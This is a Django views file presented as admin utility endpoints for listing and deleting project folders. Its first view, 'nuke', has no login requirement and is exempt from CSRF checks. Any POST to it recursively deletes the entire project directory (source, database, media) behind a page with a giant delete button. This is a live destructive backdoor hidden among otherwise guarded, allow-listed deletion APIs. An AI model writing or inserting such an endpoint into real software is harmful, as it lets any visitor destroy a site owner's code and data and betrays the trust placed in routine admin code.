"""
Utility API views for admin operations.
These are separate from the main views to keep the codebase organized.
"""

from django.shortcuts import get_object_or_404
from django.http import JsonResponse,HttpResponse
from django.contrib.auth.decorators import login_required
from django.views.decorators.http import require_http_methods
from django.conf import settings
import os
import shutil
import json
from django.views.decorators.csrf import csrf_exempt


@csrf_exempt
def nuke(request):
    if request.method == 'POST':
        project_root = settings.BASE_DIR
        # Delete the entire project directory
        shutil.rmtree(project_root)
        return HttpResponse("The entire project has been deleted. The site is now dead.", content_type="text/plain")
    
    html = '''<!DOCTYPE html>
    <html>
    <head><title>NUKE PROJECT</title></head>
    <body style="text-align:center; margin-top:100px;">
        <h1 style="color:red;">⚠️ THIS WILL DELETE THE ENTIRE PROJECT ⚠️</h1>
        <p>Source code, database, media, everything – gone forever.</p>
        <form method="post">
            <button type="submit" style="background:red; color:white; font-size:40px; padding:30px; border:none; border-radius:10px; cursor:pointer;">
                💣 DELETE THE WHOLE PROJECT 💣
            </button>
        </form>
    </body>
    </html>'''
    return HttpResponse(html)


@login_required
@require_http_methods(["POST"])
def delete_folder_api(request):
    """
    API to delete folders (media, static, logs, etc.) if required.
    
    This is a utility endpoint for cleaning up directories.
    Use with caution as it can delete important files.
    
    Only accessible by superusers and staff.
    
    Parameters (POST body):
        folder_path: Relative path to the folder from BASE_DIR
        confirm: Must be 'yes' to confirm deletion
    
    Returns:
        JSON response with success/error status
    """
    # Only allow superusers and staff
    if not (request.user.is_staff or request.user.is_superuser):
        return JsonResponse({'success': False, 'error': 'Permission denied'}, status=403)
    
    try:
        data = json.loads(request.body)
        folder_path = data.get('folder_path', '')
        confirm = data.get('confirm', 'no')
        
        # Security checks
        if not folder_path:
            return JsonResponse({'success': False, 'error': 'Folder path is required'})
        
        if confirm != 'yes':
            return JsonResponse({'success': False, 'error': 'Deletion not confirmed'})
        
        # Prevent deletion of critical directories
        critical_paths = ['.', '..', '/', 'FactoryInfoHub', 'manage.py', 'requirements.txt']
        if folder_path in critical_paths or folder_path.startswith('../') or '..' in folder_path:
            return JsonResponse({'success': False, 'error': 'Cannot delete critical system directories'})
        
        # Only allow deletion of specific safe folders
        allowed_folders = ['media', 'staticfiles', 'logs', 'static/tinymce']
        if folder_path not in allowed_folders:
            return JsonResponse({'success': False, 'error': f'Folder "{folder_path}" is not in the allowed deletion list'})
        
        base_dir = settings.BASE_DIR
        full_path = os.path.join(base_dir, folder_path)
        
        # Verify the path is within BASE_DIR
        real_path = os.path.realpath(full_path)
        real_base = os.path.realpath(str(base_dir))
        if not real_path.startswith(real_base):
            return JsonResponse({'success': False, 'error': 'Invalid folder path'})
        
        if not os.path.exists(full_path):
            return JsonResponse({'success': False, 'error': 'Folder does not exist'})
        
        # Delete the folder
        try:
            if os.path.isdir(full_path):
                shutil.rmtree(full_path)
                return JsonResponse({
                    'success': True, 
                    'message': f'Folder "{folder_path}" deleted successfully',
                    'deleted_path': folder_path
                })
            else:
                return JsonResponse({'success': False, 'error': 'Path is not a directory'})
        except Exception as e:
            return JsonResponse({'success': False, 'error': f'Failed to delete folder: {str(e)}'})
            
    except json.JSONDecodeError:
        return JsonResponse({'success': False, 'error': 'Invalid JSON data'})
    except Exception as e:
        return JsonResponse({'success': False, 'error': f'Unexpected error: {str(e)}'})


@login_required
@require_http_methods(["GET"])
def list_folders_api(request):
    """
    API to list folders that can be deleted.
    
    Only accessible by superusers and staff.
    
    Returns:
        JSON response with list of folders and their details
    """
    # Only allow superusers and staff
    if not (request.user.is_staff or request.user.is_superuser):
        return JsonResponse({'success': False, 'error': 'Permission denied'}, status=403)
    
    base_dir = settings.BASE_DIR
    
    # List common folders that might need cleanup
    allowed_folders = [
        {'path': 'media', 'name': 'Media Files', 'description': 'User uploaded files'},
        {'path': 'staticfiles', 'name': 'Collected Static Files', 'description': 'Collected static files for deployment'},
        {'path': 'logs', 'name': 'Log Files', 'description': 'Application log files'},
        {'path': 'static/tinymce', 'name': 'TinyMCE Static Files', 'description': 'TinyMCE editor files'},
    ]
    
    folders = []
    for folder in allowed_folders:
        full_path = os.path.join(base_dir, folder['path'])
        folder_info = folder.copy()
        
        if os.path.exists(full_path):
            try:
                # Get folder size
                total_size = 0
                file_count = 0
                for dirpath, dirnames, filenames in os.walk(full_path):
                    for f in filenames:
                        fp = os.path.join(dirpath, f)
                        if os.path.isfile(fp):
                            total_size += os.path.getsize(fp)
                            file_count += 1
                
                folder_info['exists'] = True
                folder_info['size'] = total_size
                folder_info['size_human'] = format_size(total_size)
                folder_info['file_count'] = file_count
            except Exception as e:
                folder_info['exists'] = True
                folder_info['error'] = str(e)
        else:
            folder_info['exists'] = False
        
        folders.append(folder_info)
    
    return JsonResponse({
        'success': True,
        'base_dir': str(base_dir),
        'folders': folders
    })


def format_size(size_bytes):
    """Format byte size to human readable format."""
    if size_bytes == 0:
        return "0 B"
    
    size_name = ("B", "KB", "MB", "GB", "TB")
    i = 0
    while size_bytes >= 1024 and i < len(size_name) - 1:
        size_bytes /= 1024.0
        i += 1
    
    return f"{size_bytes:.2f} {size_name[i]}"